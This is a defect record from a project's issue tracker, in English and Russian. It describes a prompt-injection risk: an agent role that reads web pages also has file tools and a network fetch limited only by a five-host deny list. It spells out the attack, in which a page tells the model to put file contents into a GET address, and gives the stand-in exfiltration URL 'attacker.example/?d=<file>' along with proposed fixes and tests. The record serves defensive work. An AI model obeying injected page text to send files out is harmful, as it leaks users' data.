# ISS-0119 — The Researcher of Sai Team reads untrusted web text with file tools and an open network: a prompt injection can send data out in the address of a plain GET (WebFetch is limited only by a deny list of five local names)

Серьёзность: HIGH (предложена ORCH по словам проверки; диагноз может её изменить). Статус: open. Найдено: внешняя проверка безопасности (передано ORCH 2026-11-18 другой сессией владельца); заведено DOC-UPDATER (шаг 01), прогон `SECREG-20261118-01`, 2026-11-18T15:28:05Z. Пункт планки: Q11 (внешний адрес проверяется до запроса: сейчас WebFetch ограничен списком запретов из пяти локальных имён, а не разрешённым списком), Q7 (данные проекта и секрет не попадают туда, где их прочтёт посторонний). Требования: REQ-010 (сделано; инструменты ролей и правила `--disallowedTools`). Решение: `decisions/0015`, строка 51 (утечка контекста через адрес GET названа принятым остаточным риском Q11); исправление меняет эту запись, нужна новая запись решения (Q12).

## Что не так

The words of the review (an external security review, relayed to ORCH on 2026-11-18; the reviewer used only artificial values and localhost, nothing real leaked). The review did not reproduce this on a model, and neither did this step:

1. The Researcher role (`researcher`) gets the file tools together with the network tools: `tools/src/team/role-internal.js`, line 24, adds WebSearch and WebFetch to the file tools.
2. The network of WebFetch is limited only by deny rules for local addresses: `tools/src/team/executors/claude-cli.js`, lines 31–37 (a deny list).
3. So a web page that the Researcher reads (text that anyone on the web controls) can carry an instruction to the model (a prompt injection): read a file and put its content into the address of a plain GET, for example `https://attacker.example/?d=<file>`. WebFetch fetches any address outside the five names, and the data leaves the computer in the address.

What this step saw, reading the files as text (both unchanged against the tag `base/SECREG-20261118-01`: `git diff` of the two files is empty, so the parallel run ISS-0092-20261117-01 did not move these lines):

- `tools/src/team/role-internal.js`, line 24: `[...FILE_TOOLS, "WebSearch", "WebFetch"],` in the entry `researcher` (lines 22–25); `FILE_TOOLS` is Read, Write, Edit, Glob, Grep (line 9). **Matches.** The prompt of the role (line 23) asks the model to use the network for reading only and not to open local addresses; the header of the file (lines 6–7) says these texts are hints for the model and the limit is set by the flags of the process and its working folder.
- `tools/src/team/executors/claude-cli.js`: line 31 is the comment «Deny rules of WebFetch for local addresses (section 5.2, Q11)», lines 32–38 are `WEB_DENY_RULES`, and the five rules stand on lines 33–37: `WebFetch(domain:localhost)`, `WebFetch(domain:127.0.0.1)`, `WebFetch(domain:[::1])`, `WebFetch(domain:0.0.0.0)`, `WebFetch(domain:169.254.169.254)`. **Matches** (the array closes on line 38). The rules go to `--disallowedTools` only when WebFetch is in the role's set (lines 71–73). `--tools` and `--allowedTools` carry the bare names, `WebFetch` included (lines 66–69); there is no allow rule with a domain and no rule for WebSearch. So every domain outside the five is allowed; the private networks (10/8, 172.16/12, 192.168/16, `fc00::/7`), link-local other than `169.254.169.254`, `fe80::/10` and names that point to internal addresses are not in the list either (quality-bar §2.1, Q11).
- The same launch also passes `--restricted`, `--safe-mode`, `--strict-mcp-config`, `--permission-prompts none` and `--no-session-persistence` (lines 74–83), runs in the project's working folder (`cwd`, line 204) with `shell: false` (line 207). The design of the executors records from `claude --help` that `--restricted` «ограничивает файловые инструменты рабочими папками» ("limits the file tools to the working folders"; `docs/design/REQ-010-agent-executors.md`, fact F3, line 57). Whether that holds when an injection asks for a file outside the working folder, and what inside the working folder and the task text could leave in an address, was not measured by this step (no program was run).
- The risk is already written down as an accepted residual risk, so the review moves it from a named risk to a defect: `decisions/0015`, line 51 («возможна утечка контекста через адрес, а проверить каждый адрес до запроса нельзя … он не равен полному выполнению Q11»: a leak of the context through the address is possible, and each address cannot be checked before the request; this is not full Q11); the design REQ-010, section 11 (line 868: «Остаток — частные сети (10/8, 172.16/12, 192.168/16), имена, указывающие на внутренние адреса, утечка контекста через адрес GET»); `tools/README.md`, line 379 (the same line at the tag and today): «… and a leak of the task context through the address of a request are not closed by the rules».

Good measures that the review named and that bear on this defect (seen in the same file): no shell (`shell: false`, line 207); a trimmed environment of the child, only the names of a fixed list, no key, token or `SAI_TEAM_*` (`buildChildEnv`, lines 87–95); the budget ceiling (`--max-budget-usd`, lines 62–63) and the task timeout; no sign of hidden sending in the code of Sai Team itself.

Why HIGH (as proposed): the Researcher reads text that strangers control, and the address of one GET is enough to carry data out. A real run needs `SAI_TEAM_REAL_RUNS=1`, a project ceiling above 0 and the Researcher's network not turned off; the diagnosis may change the severity.

The review's advice for now, until the fix: run Sai Team on a separate virtual machine with depersonalised data; set `SAI_TEAM_WEB=0` (by the code it removes WebSearch and WebFetch from the Researcher's set: `tools/src/team/config.js`, line 85, and `tools/src/team/executor.js`, lines 329–332; `tools/README.md`, line 337); set `SAI_PIXEL_OFFICE_STORE_TEXT=0` (ISS-0122).

## Доказательство

- The review's statements: `docs/program/public-v1/PROGRESS.md`, the table «Finding → defect», row EXT-1, and the row of 2026-11-18T15:01:53Z (the relay, the owner's word to be confirmed in the ORCH session).
- Read as text at step 01: `tools/src/team/role-internal.js` lines 6–9 and 22–25; `tools/src/team/executors/claude-cli.js` lines 31–38, 54–85, 87–95 and 200–210; `tools/src/team/executor.js` lines 327–332; `tools/src/team/config.js` line 85; `decisions/0015` line 51; `docs/design/REQ-010-agent-executors.md` lines 57 and 868.
- The launch arguments are pinned today by `tools/test/exec-roles-tools.test.js` (EX-16 of the design: the Researcher's `--disallowedTools` equals exactly the five rules; the other nine roles have none). No test sends an injection text through a role with web tools.
- Not reproduced on a model. A reproduction with a real model is a real run of Claude Code; it is not done in the pipeline without the owner's word. A diagnosis by reading and with a stand-in program (never the real `claude`, `SAI_TEAM_REAL_RUNS` never set in the person's environment) is ISSUE-FIXER's work in this defect's own WF-03 run.

## Как исправить

The acceptance that the review proposes (to be measured by the diagnosis; not a ready fix, AP-161):

1. A role that reads untrusted text and has network tools cannot read anything outside its run's project root, and WebFetch is an allow list (deny by default); or the roles are split: a web role without file access and a file role without network.
2. A test pins the launch arguments of every role that has web tools.
3. A test with an injection text that asks to fetch `https://attacker.example/?d=<file>` shows that the domain is refused.

Before the design: the fix changes the accepted residual risk of `decisions/0015` (line 51) and the words of the design REQ-010 (section 11) and of `tools/README.md` (line 379), so ORCH records a decision (Q12) and asks the owner which allow list (which domains) the Researcher gets; if the criteria of REQ-010 change, a WF-01 micro-amendment or a new requirement comes first. The diagnosis also measures what `--restricted` already holds on the file side, and what an allowed domain can still carry in its own address (a search query is also an address). A weaker check, a skipped test or a removed rule is not a fix (Q6).

## Маршрут

WF-03, the first of the five (the order ISS-0119 … ISS-0123 of `docs/program/public-v1/PROGRESS.md`): ISSUE-FIXER (diagnosis, no real `claude`), the owner's decision on `decisions/0015` and the allow list, WF-01 if the criteria of REQ-010 change, then CODE-DESIGNER and CODE-DESIGN-VALIDATOR, CODE-FIXER, SECURITY-REVIEWER and REVIEWER at the same time, TEST-DESIGNER and TEST-DESIGN-VALIDATOR, RELEASE-VALIDATOR. Before the public release (PROGRESS, row EXT-1). Open question to the reviewer, through ORCH and the owner: which part of the code was reviewed (which commit or which files), and whether anything was checked on Windows.
